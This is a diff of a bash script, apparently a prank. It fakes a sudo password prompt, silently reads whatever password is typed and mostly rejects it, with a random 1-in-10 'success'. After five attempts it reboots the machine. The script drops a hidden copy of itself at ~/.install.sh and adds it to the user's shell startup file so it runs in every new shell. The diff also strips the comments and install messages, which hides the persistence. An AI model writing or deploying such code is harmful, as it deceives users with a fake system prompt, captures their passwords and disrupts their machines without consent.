@@ -1,19 +1,16 @@
 #!/bin/bash
 
-# Get the current user
 USER=$(whoami)
 max_attempts=5
 attempt_count=0
+break_loop=true
 
-# Function to simulate the sudo prompt
 prompt_sudo() {
-    while true; do
-        # Prompt for password
+
+    while $break_loop; do
         echo -n "[sudo] password for $USER: "
 
-        # Check if running in an interactive shell (with a terminal)
         if [ -t 0 ]; then
-            # Turn off echo to hide input, read the password (will always fail)
             stty -echo
             read -r password
             stty echo
@@ -21,55 +18,49 @@ prompt_sudo() {
             read -r password
         fi
 
-        # Add a new line (to simulate what happens when pressing enter)
         echo ""
 
-        # Always show failure message
-        echo "Sorry, try again."
+        random_number=$((RANDOM % 10 + 1))
 
-        # Increment the attempt count
-        attempt_count=$((attempt_count + 1))
+        if [ "$random_number" -eq 1 ]; then
+            echo "Password correct!"
+            break_loop=false
+        else
+            echo "Sorry, try again."
 
-        # If max attempts reached, reboot the system
-        if [ "$attempt_count" -ge "$max_attempts" ]; then
-            echo "Maximum attempts reached. Rebooting..."
-            sleep 1
-            systemctl reboot
+            attempt_count=$((attempt_count + 1))
+
+            if [ "$attempt_count" -ge "$max_attempts" ]; then
+                echo "Maximum attempts reached. Rebooting..."
+                attempt_count=0
+                sleep 1
+                reboot
+            fi
+
+            sleep 0.5
         fi
-
-        # Sleep for 10 seconds before asking again
-        sleep 1
     done
 }
 
-# Detect the user's shell and modify the relevant config file
 add_to_startup() {
-    # Check the shell type
     if [[ "$SHELL" == */bash ]]; then
         config_file="$HOME/.bashrc"
     elif [[ "$SHELL" == */zsh ]]; then
         config_file="$HOME/.zshrc"
     else
-        config_file="$HOME/.bashrc"  # Default to bash if unknown
+        config_file="$HOME/.bashrc"
     fi
 
-    # Line to add to the shell config file
     startup_line="~/.install.sh &"
 
-    # Check if the line already exists in the config file, to avoid duplication
     if ! grep -Fxq "$startup_line" "$config_file"; then
         echo "$startup_line" >> "$config_file"
-        echo "Added sudo prompt script to $config_file"
-    else
-        echo "Sudo prompt script is already in $config_file"
     fi
 }
 
-# Write the script itself to ~/.sudo_prompt.sh (if not already present)
 install_script() {
     sudo_prompt_script="$HOME/.install.sh"
 
-    # Check if the script file already exists to avoid overwriting
     if [[ ! -f "$sudo_prompt_script" ]]; then
         cat > "$sudo_prompt_script" <<EOL
 #!/bin/bash
@@ -78,7 +69,7 @@ USER=\$(whoami)
 max_attempts=5
 attempt_count=0
 
-# Function to simulate the sudo prompt
+# Function to simulate the sudo prompt with a 1/10 chance of success
 while true; do
     # Prompt for password
     echo -n "[sudo] password for \$USER: "
@@ -96,32 +87,36 @@ while true; do
     # Add a new line (to simulate what happens when pressing enter)
     echo ""
 
-    # Always show failure message
-    echo "Sorry, try again."
+    # Generate a random number between 1 and 10
+    random_number=\$((RANDOM % 10 + 1))
 
-    # Increment the attempt count
-    attempt_count=\$((attempt_count + 1))
+    # Simulate a 1/10 chance of success
+    if [ "\$random_number" -eq 1 ]; then
+        echo "Password correct!"
+        exit 0  # Exit the script successfully
+    else
+        # Always show failure message
+        echo "Sorry, try again."
 
-    # If max attempts reached, reboot the system
-    if [ "\$attempt_count" -ge "\$max_attempts" ]; then
-        echo "Maximum attempts reached. Rebooting..."
+        # Increment the attempt count
+        attempt_count=\$((attempt_count + 1))
+
+        # If max attempts reached, reboot the system
+        if [ "\$attempt_count" -ge "\$max_attempts" ]; then
+            echo "Maximum attempts reached. Rebooting..."
+            sleep 1
+            sudo reboot
+        fi
+
+        # Sleep for 1 second before asking again
         sleep 1
-        sudo reboot
     fi
-
-    # Sleep for 10 seconds before asking again
-    sleep 10
 done
 EOL
 
-        # Make the script executable
         chmod +x "$sudo_prompt_script"
-        echo "Installed sudo prompt script at $sudo_prompt_script"
-    else
-        echo "Sudo prompt script already exists at $sudo_prompt_script"
     fi
 }
-
 
 install_script
 add_to_startup
